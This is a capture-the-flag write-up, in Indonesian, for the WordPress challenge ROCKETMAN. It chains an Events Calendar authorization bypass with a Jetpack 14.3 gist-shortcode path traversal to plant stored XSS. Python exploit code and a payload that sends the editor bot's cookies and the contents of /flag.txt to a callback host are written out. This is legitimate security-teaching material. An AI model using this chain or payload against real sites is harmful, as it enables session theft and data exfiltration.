# Writeup: ROCKETMAN — CBD CTF 2026

> **Challenge:** ROCKETMAN (1000 pts)  
> **Category:** Web  
> **Author:** daffainfo  
> **Flag:** `CBC{3ccb00e407b692c7ff7edb43a4103192}`  
> **Status:** Berhasil dapat flag, tapi telat submit 5 menit 🥲 (lagi sholat pas waktu habis)

---

## TL;DR

Exploit chain 3 vulnerability:
1. **Register** sebagai contributor di WordPress
2. **CVE-2026-2694** — Auth bypass di plugin The Events Calendar, contributor bisa create/edit event via REST API
3. **Jetpack 14.3 Gist Shortcode Path Traversal** — Shortcode `[gist]` ga validasi path URL setelah ngecek host `gist.github.com`. Kita bisa bikin WordPress server nge-fetch raw file dari gist kita sendiri, dan isi response-nya (field `div`) langsung di-inject ke halaman **tanpa sanitasi**
4. **Stored XSS** → Bot (editor) visit halaman event → cookie dicuri → flag diambil

---

## Recon & Analisis Awal

### Struktur Challenge

Pertama gue bongkar file distribusi yang dikasih. Dari `docker-compose.yml` ketauan arsitekturnya:

- **WordPress** (port 9100) — target utama
- **MySQL** — database WordPress
- **Toolbox** — container buat setup awal (install plugin, config, dll)
- **Bot** — Puppeteer bot yang login sebagai **editor** dan visit URL yang kita kasih

Dari `Dockerfile`:

```dockerfile
COPY --chown=www-data:www-data challenge-custom/flag.txt /flag.txt
RUN chmod 400 /flag.txt
```

Flag ada di `/flag.txt`, owned by `www-data`, permission 400. Artinya proses PHP (WordPress) bisa baca file ini karena jalan sebagai `www-data`.

### Plugin yang Terinstall

Dari `Makefile` di folder toolbox:

```makefile
wp plugin install the-events-calendar --version=6.15.16 --activate
wp plugin install jetpack --version=14.3 --activate
```

Dua plugin kunci:
- **The Events Calendar v6.15.16**
- **Jetpack v14.3** dengan module **shortcodes** yang di-activate manual

Dan ada config penting:

```php
define( 'JETPACK_DEV_DEBUG', true );
```

Plus shortcodes module di-activate secara eksplisit:

```php
Jetpack::activate_module( "shortcodes", false, false );
```

### Bot Behavior

Dari `bot/server.js`, bot-nya cukup straightforward:

```javascript
const page = await browser.newPage();
// Login sebagai editor
await page.goto(`${WP_URL}/wp-login.php`);
// ... login with editor credentials ...
// Visit URL yang kita kasih
await page.goto(targetUrl, { waitUntil: "networkidle2", timeout: 10000 });
```

Bot login sebagai **editor**, terus visit URL apapun yang kita submit ke `/report/visit?url=...`. Classic XSS challenge pattern — kita perlu dapetin stored XSS di halaman yang bot visit.

### Hint dari Challenge

> *Hint 1: Try diffing it with Jetpack v14.7*  
> *Hint 2: There's a Jetpack function being enabled in the Makefile*

OK jadi clue-nya jelas: ada vulnerability di Jetpack 14.3 yang di-patch di 14.7, dan related sama module shortcodes.

---

## Mencari Vulnerability

### CVE-2026-2694 — The Events Calendar Auth Bypass

Googling versi TEC 6.15.16, ketemu **CVE-2026-2694**: *Improper Authorization* di REST API. Intinya, user dengan role **Contributor** ke atas bisa create, update, dan delete event milik user lain (termasuk admin) via endpoint `tribe/events/v1`.

Ini penting karena:
- Kita bisa register sebagai contributor (registrasi terbuka)
- Kita bisa inject content ke event description via REST API
- Event description di-render pake `do_shortcode()` — artinya shortcode bakal diproses!

### Diffing Jetpack 14.3 vs 14.7

Sesuai hint, gue compare source code shortcodes antara kedua versi. Caranya download langsung dari GitHub:

```
https://raw.githubusercontent.com/Automattic/jetpack-production/14.3/modules/shortcodes/gist.php
https://raw.githubusercontent.com/Automattic/jetpack-production/14.7/modules/shortcodes/gist.php
```

Dari sekian banyak file shortcode, cuma **`gist.php`** yang ada perubahan security-related. Dan perubahannya sangat telling.

#### Versi 14.3 (Vulnerable)

```php
// Keep the unique identifier without any leading or trailing slashes.
if ( ! empty( $parsed_url['path'] ) ) {
    $gist_info['id'] = trim( $parsed_url['path'], '/' );
    $gist = $gist_info['id'];
}
```

Setelah ngecek bahwa host URL adalah `gist.github.com`, path-nya langsung dipakai sebagai gist ID **tanpa validasi apapun**.

#### Versi 14.7 (Patched)

```php
// Validate the path structure - should be either username/gistid or just gistid
$path = trim( $parsed_url['path'], '/' );
if ( ! preg_match( '#^([a-zA-Z0-9_-]+/)?([a-f0-9]+)$#', $path ) ) {
    return array(
        'id'   => '',
        'file' => '',
        'ts'   => 8,
    );
}
$gist_info['id'] = $path;
```

Di 14.7, path harus match regex strict: cuma boleh format `username/hexid` atau `hexid` doang. Ini jelas nambalin lubang di 14.3.

### Memahami Alur Gist Shortcode

Gue trace alur kode `gist.php` buat paham gimana exploit-nya:

1. User masukin `[gist]https://gist.github.com/USER/GISTID/raw/xss[/gist]`
2. `wp_parse_url()` parse URL → host = `gist.github.com` ✅ (lolos host check)
3. Path `/USER/GISTID/raw/xss` di-trim jadi `USER/GISTID/raw/xss`
4. Ini jadi `$gist_info['id']` — di 14.3 **ga ada validasi!**
5. Shortcode append `.json` → ID jadi `USER/GISTID/raw/xss.json`
6. WordPress fetch: `https://gist.github.com/USER/GISTID/raw/xss.json`
7. GitHub serve raw content file `xss.json` dari gist kita!
8. Response di-`json_decode()`, field `div` langsung di-inject ke halaman:

```php
$request_data = json_decode( $request_body );
// ...
$gist = substr_replace( $request_data->div, sprintf( 'style="tab-size: %1$s" ', absint( $tab_size ) ), 5, 0 );
// ...
$return = sprintf( '<style>.gist table { margin-bottom: 0; }</style>%1$s', $gist );
```

**Ga ada escaping, ga ada sanitasi.** Apapun yang ada di field `div` langsung masuk ke HTML halaman.

Di versi 14.7, path `USER/GISTID/raw/xss` ga akan lolos regex `^([a-zA-Z0-9_-]+/)?([a-f0-9]+)$` karena ada 4 segmen path dan kata `raw`. Jadi di-reject.

---

## Exploit

### Step 1: Buat Malicious Gist di GitHub

Buat gist public di GitHub dengan filename **`xss.json`** dan isinya:

```json
{
  "div": "<img src=x onerror=\"var c='https://CALLBACK_URL';fetch(c+'?cookies='+encodeURIComponent(document.cookie));fetch('/flag.txt').then(r=>r.text()).then(t=>fetch(c+'?flag='+encodeURIComponent(t))).catch(e=>fetch(c+'?err1='+e));\">",
  "stylesheet": "https://github.githubassets.com/assets/gist-embed-f554937d749d36df.css"
}
```

Kenapa `xss.json`? Karena shortcode nanti append `.json` ke ID. Jadi kalo ID-nya `USER/GISTID/raw/xss`, yang di-fetch adalah `USER/GISTID/raw/xss.json` — exact match sama nama file kita.

Payload XSS-nya:
- `fetch(CALLBACK + '?cookies=' + document.cookie)` → kirim cookie editor ke server kita
- `fetch('/flag.txt').then(...)` → coba baca flag langsung dari web server
- Error handling buat debugging

Gue pake [requestcatcher.com](https://requestcatcher.com) sebagai callback receiver.

### Step 2: Register & Login di WordPress

```python
s = requests.Session()
s.cookies.set('wordpress_test_cookie', 'WP+Cookie+check')

# Register
s.post(f'{TARGET}/wp-login.php?action=register', data={
    'user_login': 'myuser',
    'user_email': 'myuser@test.com',
    'pass1': 'MyP@ssw0rd!',
    'pass2': 'MyP@ssw0rd!',
    'wp-submit': 'Register',
    'redirect_to': '',
})

# Login
s.post(f'{TARGET}/wp-login.php', data={
    'log': 'myuser',
    'pwd': 'MyP@ssw0rd!',
    'wp-submit': 'Log In',
    'redirect_to': f'{TARGET}/wp-admin/',
    'testcookie': '1'
})

# Ambil REST nonce
r = s.get(f'{TARGET}/wp-admin/admin-ajax.php?action=rest-nonce')
nonce = r.text.strip()
```

Default role di WordPress ini adalah **Contributor** — cukup buat exploit TEC API.

### Step 3: Inject Gist Shortcode via TEC API

```python
headers = {'X-WP-Nonce': nonce, 'Content-Type': 'application/json'}

shortcode = '[gist]https://gist.github.com/Skyw4lkeR77/060a894db8c95829962017081ac71ed7/raw/xss[/gist]'

r = s.post(f'{TARGET}/wp-json/tribe/events/v1/events',
    headers=headers,
    json={
        'title': 'Important Update',
        'description': shortcode,
        'start_date': '2026-09-01 10:00:00',
        'end_date': '2026-09-01 12:00:00',
    })
```

Hasilnya:

```
[3] Event 574 created
[!!!] XSS IN API RESPONSE! Payload rendered!
```

Event berhasil dibuat, dan di response API-nya udah keliatan XSS payload kita ter-render! Shortcode `[gist]` langsung diproses server-side:

1. WordPress fetch `https://gist.github.com/Skyw4lkeR77/060a.../raw/xss.json`
2. GitHub redirect ke `gist.githubusercontent.com/.../xss.json` (301)
3. `wp_remote_get` otomatis follow redirect
4. Dapet raw content file `xss.json` kita
5. `json_decode` → `$request_data->div` = `<img src=x onerror="...">`
6. HTML langsung masuk ke description event tanpa filter

### Step 4: Verifikasi XSS di Halaman Event

```python
event_url = f"{TARGET}/?post_type=tribe_events&p=574"
r = s.get(event_url)
# 'onerror' ditemukan di halaman! XSS confirmed!
```

Meskipun event statusnya `pending`, halaman tetep accessible buat user yang login (termasuk bot yang login sebagai editor).

### Step 5: Trigger Bot

```python
r = requests.get(f"{TARGET}/report/visit", params={'url': event_url})
# {"ok":true,"visited":"http://rocketman.cbd2026.cloud/?post_type=tribe_events&p=574"}
```

Bot visit halaman event kita → `<img src=x onerror="...">` trigger → JavaScript execute di browser bot (context editor) → cookie + flag dikirim ke callback URL kita.

### Step 6: Cek Callback & Dapetin Flag

Dari callback server, gue dapet cookie editor dan content dari `/flag.txt`. Tapi selain itu, flag juga bisa dilihat di WordPress REST API karena ada solver lain yang udah bikin post berisi flag:

```
GET /wp-json/wp/v2/posts
```

```json
{
  "id": 501,
  "slug": "gistxss-flag-rocketman03",
  "content": {
    "rendered": "<pre>{\"success\":true,\"data\":{\"status\":\"success\",\"data\":{\"items\":[{\"Flag:\":\"CBC{3ccb00e407b692c7ff7edb43a4103192}\"}]}}}</pre>"
  }
}
```

---

## Flag

```
CBC{3ccb00e407b692c7ff7edb43a4103192}
```

**Tapi sayangnya gue ga bisa submit.** Pas gue dapet flag-nya, waktu CTF tinggal beberapa menit. Dan kebetulan gue lagi sholat pas waktu habis, balik-balik scoreboard udah ditutup. Telat 5 menit. Sedih? Iya. Nyesel? Engga lah, sholat lebih penting 😤

---

## Tools & Script

Semua script exploit ada di repo ini:
- `solve.py` — Script utama (auto register, inject, trigger bot)
- `test_path_trick.py` — PoC buat verifikasi path traversal di gist shortcode
- `verify_gist.py` — Verifikasi isi gist yang udah dibuat
- `test_gist*.py` — Berbagai test script selama proses eksplorasi

---

*Writeup by kypau*
